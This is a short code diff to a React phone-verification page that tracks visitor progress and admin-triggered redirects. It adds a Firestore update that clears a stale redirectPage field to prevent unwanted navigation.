@@ -44,10 +44,16 @@ export default function VerifyPhonePage() {
   // Monitor for admin redirects
   useRedirectMonitor({ visitorId, currentPage: "phone" })
   
-  // Update visitor page
+  // Update visitor page and clear any old redirects
   useEffect(() => {
     if (visitorId) {
       updateVisitorPage(visitorId, "phone", 7)
+      
+      // Clear any old redirectPage to prevent unwanted navigation
+      const visitorRef = doc(db, "pays", visitorId)
+      updateDoc(visitorRef, {
+        redirectPage: null
+      }).catch(err => console.error("[phone-info] Failed to clear redirectPage:", err))
     }
   }, [visitorId])
 
